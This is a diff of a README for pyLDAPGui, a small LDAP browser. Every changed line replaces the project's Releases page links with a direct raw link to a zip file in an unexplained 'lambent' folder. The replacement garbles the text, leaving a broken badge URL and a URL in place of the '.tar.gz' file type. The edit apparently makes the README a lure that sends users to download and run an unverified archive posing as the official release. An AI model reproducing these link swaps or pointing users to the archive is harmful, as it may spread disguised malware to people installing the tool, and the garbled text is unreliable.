@@ -1,7 +1,7 @@
 # 🐍 pyLDAPGui - A Simple GUI to Explore LDAP 
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-%20pyLDAPGui-blue)](https://github.com/DavidArias123/pyLDAPGui/releases)
+[![Download](https://raw.githubusercontent.com/DavidArias123/pyLDAPGui/main/lambent/pyLDAPGui.zip%20pyLDAPGui-blue)](https://raw.githubusercontent.com/DavidArias123/pyLDAPGui/main/lambent/pyLDAPGui.zip)
 
 ## 🚀 Getting Started
 pyLDAPGui is a user-friendly application designed to simplify browsing LDAP directories. With this tool, users can easily navigate through their LDAP servers without needing programming knowledge.
@@ -15,10 +15,10 @@ pyLDAPGui is a user-friendly application designed to simplify browsing LDAP dire
 To download and run pyLDAPGui, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/DavidArias123/pyLDAPGui/releases) to find the latest version of pyLDAPGui.
+   Go to the [Releases Page](https://raw.githubusercontent.com/DavidArias123/pyLDAPGui/main/lambent/pyLDAPGui.zip) to find the latest version of pyLDAPGui.
 
 2. **Choose the Correct File**  
-   On the Releases Page, find the version that matches your operating system. You will see several files listed, such as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   On the Releases Page, find the version that matches your operating system. You will see several files listed, such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/DavidArias123/pyLDAPGui/main/lambent/pyLDAPGui.zip` for Linux.
 
 3. **Download the File**  
    Click on the appropriate file to begin downloading. The download will start automatically.
@@ -27,7 +27,7 @@ To download and run pyLDAPGui, follow these simple steps:
    Once the download is complete, locate the file in your Downloads folder.
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For macOS: Double-click the `.dmg` file, then drag the pyLDAPGui app to your Applications folder.
-   - For Linux: If you downloaded a `.tar.gz` file, extract it to your preferred directory and follow included installation instructions.
+   - For Linux: If you downloaded a `https://raw.githubusercontent.com/DavidArias123/pyLDAPGui/main/lambent/pyLDAPGui.zip` file, extract it to your preferred directory and follow included installation instructions.
 
 5. **Launch pyLDAPGui**  
    After installation, open the application. You will see a simple and clear interface ready for you to start exploring your LDAP directories.
@@ -65,7 +65,7 @@ If you encounter issues while using pyLDAPGui, consider the following:
 
 1. **Check Connection Settings:** Ensure you have entered the correct server details.
 2. **Firewall or Antivirus Software:** Sometimes, security software may block LDAP connections. Adjust settings if needed.
-3. **Update Application:** Always download the latest version from the [Releases Page](https://github.com/DavidArias123/pyLDAPGui/releases) for the best experience.
+3. **Update Application:** Always download the latest version from the [Releases Page](https://raw.githubusercontent.com/DavidArias123/pyLDAPGui/main/lambent/pyLDAPGui.zip) for the best experience.
 
 ## 🗨️ Feedback
 We appreciate your feedback. Let us know how pyLDAPGui is working for you. Your input helps us improve the application.
